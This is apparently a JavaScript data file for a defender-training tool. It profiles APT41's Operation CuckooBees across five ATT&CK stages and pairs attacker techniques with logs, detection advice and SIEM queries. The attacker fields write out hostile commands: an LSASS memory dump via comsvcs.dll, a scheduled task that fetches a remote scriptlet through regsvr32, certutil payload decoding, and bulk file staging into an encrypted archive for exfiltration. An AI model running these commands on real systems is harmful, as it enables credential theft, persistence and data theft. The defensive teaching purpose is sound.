const apt41 = {
  id: "apt41",
  name: "APT41",
  aliases: ["Winnti", "Double Dragon", "Barium", "Earth Baku"],
  origin: "China",
  motivation: "Espionage / Financial",
  description:
    "APT41 is a Chinese state-sponsored threat actor uniquely conducting both espionage on behalf of Chinese intelligence services and financially motivated cybercrime. Active since at least 2012, targeting healthcare, telecom, technology, and defense sectors globally.",
  campaigns: [
    {
      id: "cuckoo-bees-2022",
      name: "Operation CuckooBees",
      year: "2022",
      target: "Pharmaceutical & Defense Companies",
      summary:
        "APT41 conducted a decade-long stealth espionage campaign targeting pharmaceutical, manufacturing, and defense companies across North America, Europe, and Asia — stealing hundreds of gigabytes of IP including drug formulas, proprietary research, and defense blueprints.",
      sources: [
        "Cybereason Operation CuckooBees Report (2022)",
        "CISA Advisory AA22-279A",
        "Mandiant APT41 Profile",
      ],
      stages: [
        {
          id: "initial-access",
          name: "Initial Access",
          ttp: "T1195",
          ttpName: "Supply Chain Compromise",
          phase: "Initial Access",
          attacker: {
            summary:
              "APT41 compromised third-party ERP and enterprise software vendors to inject malicious code into legitimate update packages. Victims installed trojanized updates from trusted vendors, giving APT41 a foothold inside hardened corporate networks without triggering perimeter defenses.",
            tools: ["Custom DLL injector", "DUSTPAN dropper", "Trojanized update packages"],
            commands: [
              "// Malicious DLL planted inside vendor software update",
              "// Dropper disguised as: SAPUpdate.dll / OracleSync.dll",
              "// Executed on victim install via legitimate process: sap.exe → DUSTPAN",
              "// C2 beacon initiated post-install: 45.77.229[.]104:443",
            ],
          },
          defender: {
            logs: [
              "Software update installed from vendor (MSI/EXE install Event ID 1033)",
              "New DLL loaded by enterprise application process (Sysmon Event ID 7)",
              "Unexpected outbound connection from ERP process to uncategorized external IP",
              "Process tree anomaly: sap.exe → cmd.exe → powershell.exe",
            ],
            detection:
              "Baseline all outbound network connections for enterprise software processes. Alert on ERP or vendor processes spawning shells or connecting to external IPs. Validate software update hashes against vendor-published checksums before deployment.",
            siemQuery:
              'index=endpoint process_parent_name IN ("sap.exe","oracle.exe","manage*") process_name IN ("cmd.exe","powershell.exe","wscript.exe") | stats count by host, process_parent_name, process_name, cmdline',
            ifMissed:
              "APT41 establishes an undetected foothold inside the corporate network. DUSTPAN dropper deploys secondary payloads and begins internal reconnaissance. The attacker operates from a trusted host with legitimate software as cover, invisible to perimeter controls.",
          },
        },
        {
          id: "execution",
          name: "Execution via Windows Command Shell",
          ttp: "T1059.003",
          ttpName: "Command and Scripting Interpreter: Windows Command Shell",
          phase: "Execution",
          attacker: {
            summary:
              "APT41 used cmd.exe extensively to execute reconnaissance commands, drop payloads to disk, and chain LOLBins (Living-off-the-Land Binaries) to evade signature-based AV. certutil decoded staged payloads; wmic enumerated the domain; output was written to temp files disguised as Windows crash dumps.",
            tools: ["cmd.exe", "certutil.exe", "wmic.exe", "DUSTPAN", "PRIVATELOG"],
            commands: [
              "cmd.exe /c whoami /all > C:\\Windows\\Temp\\~df1.tmp",
              "cmd.exe /c net view /domain >> C:\\Windows\\Temp\\~df1.tmp",
              "cmd.exe /c certutil -decode C:\\ProgramData\\update.b64 C:\\ProgramData\\update.dll",
              "cmd.exe /c wmic /node:192.168.1.0/24 os get caption,version /format:csv",
              "cmd.exe /c reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            ],
          },
          defender: {
            logs: [
              "cmd.exe spawned by non-shell parent (Event ID 4688 with command line)",
              "certutil.exe writing binary file to %ProgramData% (Sysmon Event ID 11)",
              "wmic.exe making remote network connections (Event ID 4688)",
              "Temp directory DLL write followed by rundll32 load (Sysmon Event ID 7)",
            ],
            detection:
              "Enable command-line logging (Event ID 4688 with process command line auditing). Alert on certutil decoding or downloading files. Flag wmic remote execution and cmd.exe spawned from unusual parents such as ERP processes or Windows services.",
            siemQuery:
              'index=endpoint EventCode=4688 process_name="certutil.exe" (cmdline="*-decode*" OR cmdline="*-urlcache*") | stats count by host, user, cmdline',
            ifMissed:
              "APT41 completes internal reconnaissance undetected. Network topology, domain structure, and high-value targets identified. Secondary payloads decoded and staged. Attacker fully understands the environment and pivots to establishing persistent access.",
          },
        },
        {
          id: "persistence",
          name: "Persistence via Scheduled Tasks",
          ttp: "T1053.005",
          ttpName: "Scheduled Task/Job: Scheduled Task",
          phase: "Persistence",
          attacker: {
            summary:
              "APT41 created scheduled tasks named to mimic legitimate Windows maintenance jobs. The PRIVATELOG implant stored its payload inside Windows Common Log File System (CLFS) log files — a novel anti-forensics technique rendering the payload invisible to dir, Get-ChildItem, and most EDR file scanners.",
            tools: ["schtasks.exe", "PRIVATELOG", "DUSTTRAP", "CLFS log steganography"],
            commands: [
              'schtasks /create /tn "\\Microsoft\\Windows\\Maintenance\\USORefresh" /tr "rundll32 C:\\Windows\\System32\\wbem\\wmiutils.dll,WmiApSrv" /sc ONLOGON /ru SYSTEM',
              'schtasks /create /tn "\\Microsoft\\Windows\\WDI\\SrvHost" /tr "regsvr32 /s /n /u /i:http://update.microsoft-cdn[.]com/p.sct scrobj.dll" /sc HOURLY',
              "// PRIVATELOG hides encrypted payload inside CLFS .blf transaction log files",
              "// Payload unreadable to: dir, Get-ChildItem, most commercial EDR file scanners",
            ],
          },
          defender: {
            logs: [
              "Scheduled task created with encoded command line (Event ID 4698)",
              "Task XML written to C:\\Windows\\System32\\Tasks\\ (Event ID 4663)",
              "regsvr32.exe or rundll32.exe loading DLL from non-standard path (Sysmon Event ID 7)",
              "CLFS .blf file created in non-standard directory by non-system process (Sysmon Event ID 11)",
            ],
            detection:
              "Monitor Event ID 4698 for tasks with obfuscated or LOLBin command lines. Alert on regsvr32/rundll32 loading from temp or ProgramData. For CLFS abuse: alert on .blf file creation by any non-Windows process outside system directories.",
            siemQuery:
              'index=endpoint EventCode=4698 | rex field=TaskContent "(?i)<Command>(?P<cmd>[^<]+)</Command>" | where match(cmd,"(?i)(regsvr32|rundll32|certutil|mshta|wscript|cscript)") | stats count by host, TaskName, cmd',
            ifMissed:
              "APT41 achieves multi-year persistence. Reboots and AV scans do not remove the implant. PRIVATELOG payload hidden in CLFS logs survives forensic investigation and reimaging cycles. Attacker retains access for ongoing IP theft spanning years.",
          },
        },
        {
          id: "privilege-escalation",
          name: "Privilege Escalation via Valid Accounts",
          ttp: "T1078",
          ttpName: "Valid Accounts",
          phase: "Privilege Escalation",
          attacker: {
            summary:
              "APT41 harvested domain credentials using DUSTTRAP's built-in credential dumper and the WINNKIT kernel-mode rootkit, which hooked LSASS to extract plaintext credentials. They targeted high-privilege service accounts used by ERP systems, then authenticated laterally blending with normal IT admin activity.",
            tools: ["WINNKIT rootkit", "DUSTTRAP", "Mimikatz", "Custom LSASS dumper"],
            commands: [
              "// WINNKIT kernel driver hooks NtQuerySystemInformation to hide attacker processes",
              "// Direct LSASS memory read bypasses AV user-mode hooks",
              "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Windows\\Temp\\~tmp.dmp full",
              "net use \\\\DC01\\ADMIN$ /user:CORP\\svc_erp P@ssw0rd!2022",
              "wmic /node:DC01 process call create \"cmd.exe /c whoami\"",
            ],
          },
          defender: {
            logs: [
              "LSASS opened by non-standard process (Sysmon Event ID 10, GrantedAccess: 0x1010)",
              "comsvcs.dll MiniDump invocation writing .dmp to temp (Event ID 4663)",
              "Service account logon from unexpected source workstation (Event ID 4624 Type 3)",
              "Unsigned or revoked kernel driver loaded (System Event ID 7045)",
            ],
            detection:
              "Enable LSASS protection (PPL) and alert on any process opening LSASS with PROCESS_VM_READ access rights. Monitor service account logons for anomalous source hosts. Alert on kernel driver loads with revoked, expired, or unsigned certificates.",
            siemQuery:
              'index=endpoint EventCode=10 TargetImage="*lsass.exe" GrantedAccess IN ("0x1010","0x1410","0x147a","0x143a") NOT SourceImage IN ("C:\\\\Windows\\\\system32\\\\*","C:\\\\Program Files\\\\*") | stats count by host, SourceImage, GrantedAccess',
            ifMissed:
              "APT41 obtains domain admin credentials. Full lateral movement across all domain-joined systems becomes possible. WINNKIT rootkit hides attacker processes from EDR and Task Manager. Defenders observe no anomalous processes despite full domain compromise.",
          },
        },
        {
          id: "exfiltration",
          name: "Exfiltration over C2 Channel",
          ttp: "T1041",
          ttpName: "Exfiltration Over C2 Channel",
          phase: "Exfiltration",
          attacker: {
            summary:
              "APT41 exfiltrated hundreds of gigabytes of pharmaceutical IP and defense blueprints through the existing DUSTTRAP C2 channel. Data was staged locally, compressed and AES-256 encrypted with a custom routine, then chunked into HTTPS POST requests disguised as software telemetry traffic to evade DLP inspection.",
            tools: ["DUSTTRAP", "Custom AES-256 encryptor", "7-Zip (renamed binary)", "WinRAR"],
            commands: [
              "cmd.exe /c xcopy \\\\fileserver\\Research\\* C:\\Windows\\Temp\\cab\\ /S /E /H /Y",
              "// Compress and encrypt with renamed 7-Zip binary",
              "C:\\Windows\\Temp\\svchost32.exe a -mx9 -mhe -p<key> C:\\Windows\\Temp\\out.7z C:\\Windows\\Temp\\cab\\*",
              "// Exfil via DUSTTRAP HTTPS: mimics software telemetry",
              "// User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Update/2.1.4)",
              "// Rate-limited to ~2 MB/min to blend with baseline traffic patterns",
            ],
          },
          defender: {
            logs: [
              "Bulk xcopy/robocopy read across file server shares (File audit Event ID 4663)",
              "Renamed process writing compressed archive to C:\\Windows\\Temp\\ (Sysmon Event ID 11)",
              "Sustained high-volume HTTPS upload to uncategorized external IP (NetFlow/proxy)",
              "Large archive created then deleted in system temp directory (Sysmon Event ID 23)",
            ],
            detection:
              "Enable file server auditing and alert on bulk read operations exceeding threshold. DLP rules for large archive creation in system directories. NetFlow alerts for sustained uploads over 100 MB to uncategorized destinations from server hosts. Alert on renamed binaries via original filename mismatch.",
            siemQuery:
              'index=network dest_port=443 bytes_out > 10000000 NOT dest IN (known_saas_list) src_category="server" | stats sum(bytes_out) as total_bytes by src_ip, dest_ip | where total_bytes > 100000000 | sort - total_bytes',
            ifMissed:
              "Hundreds of gigabytes of pharmaceutical formulas, clinical trial data, and defense contractor IP silently exfiltrated over months. Stolen IP accelerates Chinese state-owned pharmaceutical R&D and informs defense procurement. Victim organizations remain unaware for years.",
          },
        },
      ],
    },
  ],
}

export default apt41
